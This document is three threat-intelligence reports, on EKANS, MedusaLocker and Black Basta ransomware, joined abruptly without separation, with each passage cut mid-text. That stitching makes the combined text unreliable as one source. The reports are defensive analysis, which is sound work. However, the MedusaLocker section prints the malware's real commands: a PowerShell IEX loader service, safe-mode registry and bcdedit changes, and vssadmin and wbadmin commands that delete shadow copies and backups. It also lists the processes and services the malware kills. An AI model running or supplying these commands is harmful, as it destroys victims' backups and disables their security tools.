script, Active Directory compromise, or some other\nmechanism to achieve simultaneous infection and system disruption.\n\n\n\n7/17\n\nEKANS Relationship to MEGACORTEX\n\nWhile researching EKANS and the processes identified in Appendix A, Dragos made a\nconnection to another ransomware family, MEGACORTEX. [14] Process kill activity similar\nto EKANS was observed in a newer, “version 2” variant of MEGACORTEX in mid-2019, as\npublicly analyzed and reported by Accenture. [15] The specific MEGACORTEX sample that\nalso references ICS processes has the following characteristics:\n\nMD5: 53dddbb304c79ae293f98e0b151c6b28\n\nSHA1: 2632529b0fb7ed46461c406f733c047a6cd4c591\n\nSHA256: 873aa376573288fcf56711b5689f9d2cf457b76bbc93d4e40ef9d7a27b7be466\n\nWhile the list of processes targeted in EKANS is relatively short and focused (64 total\nitems), the newer version of MEGACORTEX contains over 1,000 referenced items. The\nvast majority of the processes listed relate to security solutions or similar tools. However, all\nof the items referenced in the EKANS ICS list are also present in the MEGACORTEX list,\nand no additional items are present in the MEGACORTEX list with ICS significance. Based\non this information, it appears EKANS is not unique, or at least not first, in targeting ICS-\nrelated processes.\n\nInstead EKANS represents an obfuscated, hardened ransomware variant based\non prior MEGACORTEX activity.\n\nICS Significance and Implications\n\nPast concerns with ransomware in ICS environments focused on propagation mechanisms.\nEssentially, IT-focused ransomware could impact control system environments if they could\nmigrate into Windows-based portions of control system networks, thus disrupting\noperations. As such, any ICS disruption caused by ransomware represented the results of\noverly-aggressive malware propagation leading to ICS impacts.\n\nEKANS (and apparently some versions of MEGACORTEX) shift this narrative as ICS-\nspecific functionality is directly referenced within the malware. While some of these\nprocesses may reside in typical enterprise IT networks, such as Proficy servers or Microsoft\nSQL servers, inclusion of HMI software, historian clients, and additional items indicates\nsome minimal, albeit crude, awareness of control system environment processes and\nfunctionality.\n\nThe actual level of impact EKANS or ICS-aware MEGACORTEX may have on industrial\nenvironments is unclear. Targeting historian and data gathering processes at both the client\nand server level imposes significant costs on an organization and could induce a loss of\nview condition within the overall plant environment. The impacts for licensing server and\n\n\n\n8/17\n\nHMI process termination are less clear, as other processes may still be in play to enable\nfunctionality and fallbacks or “grace periods” for licensing servers may enable continued\noperations for some time absent the license management system.\n\n“EKANS and its presumed parent MEGACORTEX variant represent a unique\nand specific risk to industrial operations not previously observed in\nransomware malware operations.”\n\nNonetheless, this uncertainty remains unacceptable given the possibility to produce\ninadvertent loss of control situations depending on precise environment configuration and\nprocess links. As a result, EKANS and its presumed parent MEGACORTEX variant\nrepresent a unique and specific risk to industrial operations not previously observed in\nransomware operations. While some organizations have the emergency recourse of falling\nback into “manual mode” operations, the costs and inefficiencies of doing so (if such a\nchange-over happens absent friction) are still substantial. Given these aspects, EKANS and\nits parent present specific and unique risks and cost-imposition scenarios for industrial\nenvironments.\n\nEvaluating Alleged Links to Iran\n\nOne particular item of interest in both the vendor blog post [16] and Bloomberg article [17]\non EKANS activity is an emphasis on supposedly proven links to “Iranian strategic\ninterests.” While any connection to “strategic interests” are possible given the size and\nscope of most states’ long-term strategy, Dragos analysis finds any such link to be\nincredibly tenuous based upon available evidence. Arguments offered in favor of Iranian\ninvolvement include overlap with previously reported Dustman wiper activity, presumed\nunlikelihood of having overlapping intrusions in the same environment at the same time,\nand alleged technical similarities between EKANS and known Iran-linked operations.\n\nIn all three cases, current evidence does not support asserting an association\nwith Iranian cyber operations. [18]\n\nFirst, the correlation with Dustman is odd as all available evidence indicates Dustman took\nplace at the end of December 2019 while EKANS appears to have been active in mid-\nDecember 2019. Furthermore, Dustman authoritative reporting emerged from Saudi Arabia\nand not Bahrain, implying Dustman activity largely focused on this country. [19] While\npossible that Bapco may have been impacted by both events, even if this is the case such\nan observation does not necessitate or even imply a link between events.\n\nWhich leads to the second concern, where vendor reporting and media quotes indicate it is\nunlikely two separate entities would be engaged in a victim environment simultaneously. Yet\nas seen in high-profile cases such as the 2016 Democratic National Committee intrusion,\n[20] such operations do exist, and a plethora of other cases indicate they may not be rare.\n\n\n\n9/17\n\nThus, if Bapco did experience a Dustman event and Bapco is the victim of EKANS as well,\nthese two events represent a coincidence and prove no relationship or link to an overall\ncoordinating authority on their own.\n\nReferences are made in the two referenced sources on technical “markers” demonstrating\nEKANS similarity to Iran-linked events. Unfortunately, no such markers are present. Past,\npublicly-reported Iranian-associated IT disruptive activity exclusively focused on using\nDisttrack-like malware variants weaponizing the ElodS RawDisk driver to render victim\nmachines unusable, from the original Shamoon through ZeroCleare and Dustman. [21]\nAbsent any additional context, EKANS instead appears to be a fairly standard ransomware\nvariant, albeit with some additional concerning functionality. While there are examples of\nransomware-like malware being used as a means to achieve widespread destruction, [22]\nno evidence exists that EKANS was designed to mimic such functionality. Furthermore, past\nexperience both in cyber and physical realms (since Iranian-linked interests were happy to\nlaunch missiles and destructive drones against Saudi oil infrastructure in September 2019)\n[23] adds a significant burden to the argument such an actor would desire or need to\nobfuscate operations.\n\nOverall, no strong or compelling evidence exists to link EKANS with Iranian strategic\ninterests. While a link to Bapco is possible given the ransom email address, any further\ncorrelation to Iranian-associated activity is simply not supported by any available evidence.\n\nMitigations\n\nAt present, Dragos is not aware of how EKANS distributes itself within victim networks.\nPrimary defense against ransomware such as EKANS relies on preventing it from reaching\nor spreading through the network in the first place.\n\nHost\n\nUnlike some other recent ransomware variants, EKANS is not code signed.\nImplementing controls in control system networks to prohibit the execution of\nunsigned binaries can therefore mitigate against the execution of malware such as\nthis. Unfortunately, many legitimate vendor software packages continue to be\ndistributed in unsigned form, so this mitigation strategy may not be practical in many\ninstances.\nSimilar to the above but relying on more generic mechanisms, organizations can\nprohibit or at least monitor for the execution of previously unseen executables from\nnon-standard or non-update sources. Again, while imperfect given how some\nlegitimate software packages are created and distributed, this may nonetheless serve\nat least as an initial alarm to prompt further investigation and possibly limit the spread\nof malicious software in sensitive networks.\n\n\n\n10/17\n\nWithin the context of ICS historian operations specifically, organizations can\npotentially identify a disruptive attack in progress by implementing logic or monitoring\non their historian (such as GE Proficy in this case) to identify cases where multiple\nendpoints cease communication and reporting to the historian at approximately the\nsame time. While systems may still be offline or compromised, identifying this\ndatapoint early in the investigation will facilitate root cause analysis into the event by\nidentifying potential ICS-specific functionality, such as that displayed in EKANS.\nAlthough a frequent recommendation for ransomware events, organizations must\nplace emphasis on generating regular backups of important files and systems and\nstoring them in a secure location not easily accessible from the regular network. For\nICS operations in particular, backups must include last known-good configuration\ndata, project files, and related items to enable rapid recovery should a disruptive event\noccur.\n\nNetwork\n\nWhere possible, identify the transfer of unknown binary files via network means from\nenterprise networks to control system enclaves. While imperfect, identifying when\nexecutable code enters the ICS environment can at least allow defenders to correlate\nthis activity with other suspicious observations (such as new logon or promiscuous\nlogon activity) that may indicate an intrusion is underway.\nDragos’ Professional Services team has worked with companies disrupted by\nransomware attacks. The following are some key lessons learned from responding to\nransomware incidents at industrial companies.\n\nBeware your backups\n\nMany ransomware attacks also impact backup infrastructure. In a recent ransomware\nincident Dragos responded to, attackers encrypted the Synology network attached\nstorage (NAS) that was mounted as a Sever Message Block (SMB) share to all\nsystems to store backups. Luckily, an engineer had previously decided to take a copy\nof the backups on an external drive.  Unfortunately, the backups were about 18\nmonths old, so the victim lost a lot of production data, and the engineering\nenhancements and logic changes made during that time. In addition to maintaining\noffline backups, backup procedures should consider not only systems, but critical\ndata. While backing up a system may be fine every three months for example, critical\ndata required for business operations may need to be available down to the day or\nhour. Companies should ensure this information is identified and categorized based\non criticality and available if all systems are encrypted. Additionally, Dragos\nrecommended that logic is backed up after any significant changes.\n\nDon’t neglect the control layer\n\n\n\n11/17\n\nWhen performing recovery efforts on a plant network, primary focus may be on\nrestoring supervisory control, like impacted Windows assets. However, it may be\npossible for attackers to use ransomware to cover secondary process impacts or\ncover up an attacker’s true intent. In recent Dragos investigations, we have found\nevidence of attackers probing automation controllers, likely network enumeration and\nscanning, however this is difficult to verify. In this case, the only controller logic\navailable dated back just 18 months, so performing logic verification identified a lot of\nunexpected changes and it was unclear whether attackers or operators who forgot to\ndocument changes were responsible. Dragos recommends operators ensure\ncontroller logic is backed up frequently and procedures are available to verify logic\nafter an incident. Additionally, asset owners and operators may want to investigate\nwith vendors to identify the type of security logs available on the controllers.\n\nTime is of the essence\n\nAdversaries responsible for ransomware incidents act quickly. In many cases,\nadversaries are not interested in the underlying infrastructure or data, they just want to\nencrypt the systems as quickly as possible. In the customer ransomware incident\nmentioned above, responders observed a turnaround of less than 24 hours between\ninitial access, obtaining domain admin, and plant-wide ransomware deployment.\nAttackers in this event dropped more than 30 tools on the end points and brute forced\nauthentication credentials. Proper monitoring and response procedures could detect\nthem and block the attack; however, responders need to act quickly.\n\nConclusions\n\nEKANS ransomware is unique as it joins a handful of ICS-specific malware variants, such\nas Havex and CRASHOVERRIDE, in having specific references to industrial processes. At\nthe same time, EKANS actual implementation of such functionality is extremely primitive\nwith an indeterminate industrial impact.\n\nEKANS malware and its attempt to cease particular industrial-related processes is\nfurther evolution and context around the growing cyber threat to industrial control\nsystems, but EKANS itself is more a novelty than a discrete and worrying risk.\n\nNonetheless, EKANS (and its likely predecessor MEGACORTEX) represent an adversary\nevolution to hold control system environments specifically at risk. As such, EKANS despite\nits limited functionality and nature represents a relatively new and deeply concerning\nevolution in ICS-targeting malware. Whereas previously ICS-specific or ICS-related\nmalware was solely the playground of state-sponsored entities, EKANS appears to indicate\nnon-state elements pursuing financial gain are now involved in this space as well, even if\nonly at a very primitive level. As a result, it is incumbent upon ICS asset owners and\n\n\n\n12/17\n\noperators to learn from not only how EKANS itself functions, but the myriad ways in which\nmalicious software like EKANS can propagate and be distributed in control system\nenvironments to prepare actionable, relevant defense.\n\nAppendix A – EKANS Targeted Processes\n\nProcess Description\n\nbluestripecollector.exe BlueStripe Data Collector\n\nccflic0.exe Proficy Licensing\n\nccflic4.exe Proficy Licensing\n\ncdm.exe Nimsoft Related\n\ncertificateprovider.exe Ambiguous\n\nclient.exe Ambiguous\n\nclient64.exe Ambiguous\n\ncollwrap.exe BlueStripe Data Collector\n\nconfig_api_service.exe ThingWorx Industrial Connectivity Suite, Ambiguous\n\ndsmcsvc.exe Tivoli Storage Manager Client\n\nepmd.exe RabbitMQ Server (SolarWinds)\n\nerlsrv.exe Erlang\n\nfnplicensingservice.exe FLEXNet Licensing Service\n\nhasplmv.exe Sentinel Hasp License Manager\n\nhdb.exe Honeywell HMIWeb\n\nhealthservice.exe Microsoft SCCM\n\nilicensevc.exe GE Fanuc Licenseing\n\ninet_gethost.exe Erlang\n\nkeysvc.exe Ambiguous\n\nmanagementagenthost.exe VMWare CAF Management Agent Service\n\nmonitoringhost.exe Microsoft SCCM\n\nmsdtssrvr.exe Microsoft SQL Server Integration Service\n\n\n\n13/17\n\nmsmdsrv.exe Microsoft SQL Server Analysis Services\n\nmustnotificationux.exe Microsoft Update Notification Service\n\nn.exe Ambiguous\n\nnimbus.exe Broadcom Nimbus\n\nnpmdagent.exe Microsoft OMS Agent\n\nntevl.exe Nimsoft Monitor\n\nntservices.exe 360 Total Security\n\npralarmmgr.exe Proficy Related\n\nprcalculationmgr.exe Proficy Historian Data Calculation Service\n\nprconfigmgr.exe Proficy Related\n\nprdatabasemgr.exe Proficy Related\n\npremailengine.exe Proficy Related\n\npreventmgr.exe Proficy Related\n\nprftpengine.exe Proficy Related\n\nprgateway.exe Proficy Secure Gateway\n\nprlicensingmgr.exe Proficy License Server Manager\n\nproficyadministrator.exe Proficy Related\n\nproficyclient.exe Proficy Related\n\nproficypublisherservice.exe Proficy Related\n\nproficyserver.exe Proficy Server\n\nproficysts.exe Proficy Related\n\nprprintserver.exe Proficy Related\n\nprproficymgr.exe Proficy Plant Applications\n\nprrds.exe Proficy Remote Data Service\n\nprreader.exe Proficy Historian Data Calculation Service\n\nprrouter.exe Proficy Related\n\n\n\n14/17\n\nprschedulemgr.exe Proficy Related\n\nprstubber.exe Proficy Related\n\nprsummarymgr.exe Proficy Related\n\nprwriter.exe Proficy Historian Data Calculation Service\n\nreportingservicesservice.exe Microsoft SQL Server Reporting Service\n\nserver_eventlog.exe Proficy Event Log Service, Ambiguous\n\nserver_runtime.exe Proficy Related, Ambiguous\n\nspooler.exe Ambiguous\n\nsqlservr.exe Microsoft SQL Server\n\ntaskhostw.exe Windows OS\n\nvgauthservice.exe VMWare Guest Authentication Service\n\nvmacthlp.exe VMWare Activation Helper\n\nvmtoolsd.exe VMWare Tools Service\n\nwin32sysinfo.exe RabbitMQ\n\nwinvnc4.exe WinVNC Client\n\nworkflowresttest.exe Ambiguous\n\nFootnotes\n\n[1] Vitali Kremez; SNAKE Ransomware is the Next Threat Targeting Business Networks –\nBleepingComputer; Dragos WorldView customers should consult TR-2020-02 EKANS\nRansomware and ICS Operations\n\n[2] Ransomware Linked to Iran, Targets Industrial Controls – Bloomberg; Snake: Industrial-\nFocused Ransomware with Ties to Iran – Otorio\n\n[3] The Epic Turla (snake/Uroburos) Attacks – Kaspersky; Turla – MITRE\n\n[4] Implications of IT Ransomware for ICS Environments – Dragos\n\n[5] Out of Control: Ransomware for Industrial Control Systems – David Formby, Srikar\nDurbha, and Raheem Beyah; ClearEnergy – The “In the Wild” SCADA Ransomware\nAttacks that Never Existed – BleepingComputer\n\n[6] Open Mal Analysis Notes – Sysopfb (GitHub)\n\nhttps://twitter.com/VK_Intel/status/1214333066245812224?s=20\nhttps://www.bleepingcomputer.com/news/security/snake-ransomware-is-the-next-threat-targeting-business-networks/\nhttps://www.bloomberg.com/news/articles/2020-01-28/-snake-ransomware-linked-to-iran-targets-industrial-controls\nhttps://www.otorio.com/blog/posts/snake-industrial-focused-ransomware-with-ties-to-iran\nhttps://attack.mitre.org/groups/G0010/\nhttps://www.dragos.com/blog/industry-news/implications-of-it-ransomware-for-ics-environments/\nhttp://www.cap.gatech.edu/\nhttps://www.bleepingcomputer.com/news/security/clearenergy-the-in-the-wild-scada-ransomware-attacks-that-never-existed/\nhttps://github.com/sysopfb/open_mal_analysis_notes/blob/master/e5262db186c97bbe533f0a674b08ecdafa3798ea7bc17c705df526419c168b60.md\n\n\n15/17\n\n[7] Proficy Historian – GE\n\n[8] HMIWeb Solutions – Honeywell; Fanuc\n\n[9] ThingWorx Industrial Connectivity Product Brief – PTC; FlexNet Licensing – Flexera;\nSentinel HASP – Gemalto\n\n[10] Ransomware or Wiper?

There have\nbeen reports of MedusaLocker attacks across multiple industries, especially the healthcare industry which suffered a great deal of ransomware\nattacks during the COVID-19 pandemic.\n\nIn order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in\nsafe mode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.\n\nMedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make\nit even more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption\npractically impossible.\n\nRecently, there have been reports stating that AKO, a variant of MedusaLocker, added an element of blackmail, threatening to release stolen\nfiles publicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by Cybereason earlier\nthis year.\n\nAlthough data leak extortion threats have been found in some of MedusaLocker’s ransom notes, Cybereason did not observe evidence of\ninformation actually being exfiltrated by the MedusaLocker ransomware at the time of this research.\n\n \n\nCybereason Blocks MedusaLocker Ransomware\n\nKey Points\n\n1. High Severity: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.\n\n2. Encrypting mapped drives: MedusaLocker encrypts shared network drives of adjacent machines on the network.\n\n3. Attempted extortion: The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are\nnot made.\n\n4. Detected and Prevented: Cybereason’s platform fully detects and prevents the MedusaLocker ransomware.\n\nBreaking Down the Attack\n\nMany MedusaLocker infections typically start with two files, a ‘batch’ file and a powershell script saved as a ‘txt’ file:\n\nqzy.bat\nqzy.txt\n\nContents of the Batch file\n\nThe qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:\n\n1. Executes a Powershell script that resides in C:\\Windows\\SysWOW6\\qzy.txt, which contains the Ransomware payload.\n\n2. Changes registry keys to allow the service to run in safe mode.\n\n3. Enforce restart in safe mode.\n\n4. Restart the infected host.\n\nsc create purebackup binpath= \"%COMSPEC% /C start /b C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe -c $km =\n[IO.File]::ReadAllText('C:\\Windows\\SysWOW64\\qzy.txt'); IEX $km\" start= auto DisplayName= \"purebackup\"\n\nreg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /f\n\nreg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /ve /d \\\"Service\\\" /f\n\nbcdedit /set {default} safeboot minimal\n\nshutdown /r /f /t 00 & del %0\n\nThe batch file execution portrayed in Cybereason attack tree:\n\nhttps://www.cyber.nj.gov/threat-profiles/ransomware-variants/medusalocker\nhttps://www.infosecurity-magazine.com/news/hospitals-targeted-ransomware/\nhttps://www.crowdstrike.com/blog/double-trouble-ransomware-data-leak-extortion-part-1/\nhttps://www.cybereason.com/blog/ransomware-weapons-of-mass-disruption\n\n\n3/10\n\nMedusaLocker Batch file execution\n\nAfter the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a\nPowerSploit script known as “Invoke-ReflectivePEInjection”. The script reflectively loads the MedusaLocker ransomware to the powershell\nprocess memory.\n\nThe MedusaLocker binary encoded with base64 in the script:\n\nPowershell script snippet\n\nMutex Detection\n\nThe first thing MedusaLocker does is to check if a process with the mutex “{8761ABBD-7F85-42EE-B272-A76179687C63}” exists on the\nmachine. If the mutex already exists, the ransomware will stop its execution.\n\nCMSTP UAC BYPASS / Privilege Escalation\n\nMedusaLocker uses a known UAC bypass technique also used by other malware such as Trickbot that allows the ransomware to run with\nescalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool\nCMSTP.exe to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.\nAn implementation of that technique can be found on Github: https://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d\n\nAn almost identical implementation of the above method was seen used in our analyzed samples:\n\nhttps://github.com/PowerShellMafia/PowerSploit\nhttps://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/\nhttps://attack.mitre.org/techniques/T1191/\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware\nhttps://attack.mitre.org/techniques/T1088\nhttps://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d\n\n\n4/10\n\nUAC bypass code in IDA\n\nPersistence\n\nMedusaLocker creates creates a copy of the malware executable in the path: “%AppData%\\Roaming\\svhost.exe”, or\n“%AppData%\\Roaming\\svchostt.exe” (depends on the malware variant). And then, creates persistence by a scheduled task named “svhost”\nwhich executes every 15 minutes:\n\nScheduled task in Cybereason\n\nBypassing Security Products\n\nMedusaLocker will attempt to disable or terminate certain process and security products:\n\nwxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword\n\nIn addition, it will attempt to disable the following services:\n\nwrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.Quick\nusbarbitator64,vmware-converter,dbsrv12,dbeng8\n\nDeleting Backups and Preventing Recovery\n\nMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts:\n\nHardcoded commands in the malware\n\n\n\n5/10\n\nCommand\n\nPurpose\n\nvssadmin.exe Delete Shadows /All /Quiet\n\nDeleting all shadow copy volumes\n\nbcdedit.exe /set {default} recoveryenabled No\n\nDisabling Automatic Startup Repair\n\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\n\nDisabling Windows Error Recovery on startup\n\nwbadmin DELETE SYSTEMSTATEBACKUP\n\nDeleting backup for Windows Server\n\nwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\n\nDeleting the oldest backup on Windows Server\n\nMedusaLocker execution in the memory of powersehll.exe:\n\nMedusaLocker execution from Powershell\n\nScanning and Propagating to Remote Machines\n\nAfter a successful infection, the MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders. The ransomware\nedits the value “EnableLinkedConnections” of the following registry key:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Policies\\System\n\n“EnableLinkedConnections” value is changed\n\nIt does that so it can connect to other adjacent hosts residing on the same network, and in addition, tries to ping the entire subnet to see which\nhosts are alive:\n\n\n\n6/10\n\nPing sweep to find live hosts\n\nEncryption Whitelist Folders\n\nMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach, and encrypts files in most folders with the\nexception of:\n\n%User Profile%\\AppData\n\n\\ProgramData\n\n\\Program Files\n\n\\Program Files (x86)\n\n\\AppData\n\n\\Application Data\n\n\\intel\n\n\\nvidia\n\n\\Users\\All Users\n\n\\Windows\n\nRansom Note\n\nAlthough the ransom note of MeduzaLocker states that data has been exfiltrated, we have not observed indications of such behavior at the\nmoment by the malware:\n\n\n\n7/10\n\nRansom note\n\nCybereason Detection and Prevention\n\nCybereason is able to both detect and prevent the execution of MedusaLocker using the powershell protection component:\n\nMalicious powershell script prevented\n\nAdditionally, when the Anti-Ransomware feature is enabled, behavioral detection techniques in the platform are able to detect the deletion of\nthe shadow copies using vssadmin.exe, which will create a Malop for the ransomware behaviour:\n\nRansomware prevented\n\nMitre Att&ck Breakdown\n\nExecution Persistence Privilege Escalation

The ransomware gang has a total of 18 global victims, with the largest\nnumber of victims based in the U.S. Black Basta is known for stealing corporate data and\ndocuments before encrypting devices. They’re also known for their double extortion attacks,\nwhich shame victims into paying the demanded ransom or risk having data leaked on a leak\nsite.\n\nLast week, Avertium published a Threat Intelligence Report discussing the state of\nransomware in 2022. Ransomware trends are on the rise and one of those trends is victim\nshaming – a trend that Black Basta has made used heavily. As we get ready to dive deeper\ninto the tactics and techniques of Black Basta ransomware, let’s remember that even though\nransomware is here to stay, there are ways to protect your cyber environment and keep your\norganization safe from ransomware threat actors like Black Basta.\n\nBlack Basta Ransomware\n\nActive since April 2022, Black Basta is both ransomware and a ransomware gang. The gang\nhas been observed targeting organizations in the U.S with a hyper focus on the construction\nand manufacturing industries. They’ve also been observed targeting the real estate,\n\nhttps://www.avertium.com/resources/threat-reports/in-depth-look-at-black-basta-ransomware\nhttps://www.avertium.com/resources/threat-reports/in-depth-look-at-avoslocker-ransomware\n\n\n2/10\n\nbusiness services, food and beverage, chemicals, insurance, healthcare, and metals and\nmining industries.\n\nTwo of the most recent and well known Black Basta attacks include their attack on the\nAmerican Dental Association (ADA), as well as their attack on Deustsche Windtechnik.\n\nThe ADA is a dentist and oral hygiene advocacy association. The organization had 2.8 GB of\ndata stolen, with 30% of that data leaked on Black Basta’s leak site. The attack disrupted\nsome of the organization’s email, phone, and chat systems. The ADA had to take their\nsystems offline and worked with third party cyber security specialists to determine the\nseverity of the attack.\n\nThe German wind farm operator, Deustsche Windtechnik was attacked in April 2022 and had\nto shut off their remote data monitoring connections to their wind turbines for about two days\nas they recovered. Despite the company not confirming if they were hit with a ransomware\nattack, researchers were able to confirm that they were due to finding the company’s name\non the leak site of Black Basta.\n\nThe attack on Deustsche Windtechnik is just one of several cyber attacks on German energy\nproviders this year. In March 2022, Nordex was forced to shut down their IT systems across\nseveral locations due to a cyber attack. Viasat also suffered from a cyber attack this year,\ncausing 5,800 Enercon wind turbines in Germany to malfunction. It has not been confirmed if\nthe ADA or if Deustsche Windtechnik paid a ransom to Black Basta.\n\ntechniques and tactics\n\nA deep dive analysis into Black Basta ransomware reveals that the cyber criminals’\nransomware appends the extension “.basta” at the end of encrypted files. According to Cyble\nResearch Labs, Black Basta is a console-based executable ransomware that can only be\nexecuted with administrator privileges. After the ransomware executes, it deletes shadow\ncopies by using vssadmin.exe, removing the Windows backup so their victims can’t revert\nthe system to its previous state after encryption.\n\nAfter removing the backups, Black Basta drops two image files into the temp folder of the\ninfected system. Next, the ransomware changes the desktop wallpaper using the API\nsystemparamaterssinfoW() and uses a file called dlaksjdoiwq.jpg as the desktop\nbackground wallpaper. Once Black Basta creates the registry entry, it hijacks the FAX\nservice, checking to see if the service name FAX is present in the system. Once it verifies\nthat it’s present, Black Basta deletes the original, creating a new malicious service named\nFAX.\n\nNext, the boot options are checked using GetSystemMetrics() API, while\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Fax is\nadded in the registry to start the FAX service in safe mode. After the ransomware reboots the\n\n\n\n3/10\n\nsystem using the ShellExecuteA() API, FAX service launches and begins encryption.\nAccording to Cyble Research Labs, the following list of files and folders are excluded from\nencryption:\n\nBin\nWindows\nLocal Settings\nApplication Data\ntxt\nboot\ntxt\njpg\nDAT\nico\n\nUsing FindFirstFileW() and FindNextFileW) APIs to find files, Black Basta finds the files in\ntheir victim’s machines and encrypts them – using a multithreading approach for faster\nencryption.\n\nImage 1: Infection System in Safe Mode\n\nSource: Cyble Research Labs\n\nhttps://blog.cyble.com/\n\n\n4/10\n\nImage 2: Ransom Note by Black Basta\n\nSource: Cyble Research Lab\n\nResearchers believe that Black Basta hasn’t started recruiting affiliates in underground\nforums, but their previous advertisements they posted before their attacks suggest they use\nstolen credentials (purchased on the dark net) to get into organization’s systems.\n\nconnections to conti\n\nThe threat actors behind Black Basta were suspected to be a rebrand of the ransomware\ngang, Conti. In a previous Threat Intelligence Report we explained that Conti is a Russian-\nspeaking RaaS organization, who uses RaaS to deploy disruptive ransomware attacks that\ntarget critical infrastructure, like hospitals and government organizations. Conti generally\nfocuses on attacking companies with more than $100 million in annual revenue. They\nspecialize in double extortion operations of simultaneous data encryption and data\nexfiltration for financial gain. If the ransom is not paid, Conti will blackmail their victims by\nthreatening to publish stolen files.\n\nIn May 2021, the FBI notified the public stating that Conti tried to breach over a dozen\nhealthcare and first responder organizations. By September 2021, the gang successfully\nstole the data of several healthcare organizations. In March 2022, we published another\nThreat Intelligence Report featuring the gang. This time, we discussed Conti’s leaked internal\nchats, published on Twitter by a Ukrainian security researcher in February 2022. The leak\ncontained several years’ worth of internal chat logs linked to Conti and can be read here.\n\nBecause of the leaked chats and Conti’s leaked source code, there was speculation that\nConti’s successful ransomware operation was soon to be dismantled, but researchers found\nthat not to be the case. In fact, it appears as if Conti has simply started to rebrand and\nstrategize despite the leaked chats.\n\nWhen Black Basta hit the scene in April 2022, researchers stated that the ransomware gang\nshared similarities with Conti. For example, Black Basta’s data leak site was very similar to\nConti’s data leak site. The gangs also shared the same victim recovery portals. However,\nConti denied that they rebranded as Black Basta and called the group “kids”.\n\nhttps://blog.cyble.com/\nhttps://www.avertium.com/resources/threat-reports/an-in-depth-look-at-ransomware-gang-conti\nhttps://www.avertium.com/resources/threat-reports/in-depth-look-at-contis-leaked-log-chats\nhttps://intelx.io/?did=51fbf19b-91f5-4d2d-b4e7-504477ebe916\n\n\n5/10\n\nImage 3: Black Bata and Conti's Recovery Portals\n\nSource: Cyble Research Lab\n\nImage 4: Conti's Message\n\nSource: Twitter.com/BrettCallow\n\nDespite this declaration, researchers still held the belief that Conti rebranded as Black Basta.\nWhen Black Basta was discovered and the similarities between the two groups were pointed\nout, there was speculation that Black Basta could have been a faction of Conti that went\nrogue, and Conti was not telling the truth. When Conti’s chats were leaked, we not only\nlearned how the ransomware gang operated, but we also learned how some Conti\nemployees truly felt about attacking certain critical industries, such as healthcare.\n\nIn October of 2020, Conti’s members had plans to attack 400 hospitals in the U.S and in\nBritain. The attacks were launched during the height of the COVID-19 pandemic, when\nhospitals needed their computers the most. Additionally, Conti ultimately had access to over\n400 healthcare facilities (not specifically hospitals). In May 2021, Conti attacked Ireland’s\nHealth Service Executive (HSE) that operates the country’s public health system. It ended up\ndisrupting the public health system and the recovery costs were expected to exceed $600\nmillion.\n\nhttps://blog.cyble.com/\nhttp://twitter.com/\n\n\n6/10\n\nThe attack on HSE led to questions from some Conti members because the members were\nunder the assumption that the group didn’t attack public resources like hospitals. Some of\nConti’s managers adhered to this policy, and in June 2021, a manager named “Reshaev” told\nanother user named “Pin” that he wouldn’t attack a target he infiltrated because of this policy.\n“Pin” countered “Reshaev” and said that the network belonged to a sports clinic. “Reshaev”\nreplied that they don’t touch the healthcare sector at all, therefore they would be avoiding the\nclinic.\n\nHowever, the ban wasn’t upheld across the entire Conti organization because in October\n2021, “Reshaev” asked someone named “Stern” (the most senior Conti manager) if he\napproved of a ransomware attack against a hospital by an affiliate called “Dollar”. However,\nthere was no reply, so the question was asked again.\n\nReshaev: “Did you give the green light to the hospital lock to Dollar?”\n\nStern: “I usually don’t approve locks,” replied Stern. “Dollar” was later sent an encrypted\nnote.\n\n“Dollar” responded with a series of numbers and sums apparently calculating a 20 percent\nshare of something. In the case above, you can see how it’s possible for a former Conti\nemployee to branch off and start their own ransomware gang due to differing opinions.\nHowever, Cyberint Research, dug a little deeper and found that a ransomware sample from\nFebruary 2022, generated a ransomware note from a group named “no_name_software”.\nThe group took responsibility for Black Basta ransomware, and the Onion page disclosed in\nthe ransom note was the same Onion page Black Basta currently operates.\n\nCONTI REBRANDING INTO SMALLER GROUPS\n\nConti may not be associated with Black Basta, but that doesn’t mean they aren’t trying to\nrebrand at all. According to our partners, AdvIntel, Conti is currently rebranding as multiple\nransomware groups and that the brand, not the organization, is shutting down. On May 19,\n2022, Conti’s official website went offline, as well as their negotiations service site. Conti’s\ninfrastructure (chat rooms, servers, proxy hosts, etc.) went through a massive reset.\n\nThe publicity function of Conti’s blog is still active, but the operational function of “Conti\nNews” (used to upload new data to force victims to pay) is defunct – including infrastructure\nrelated to data uploads, negotiations, and the hosting 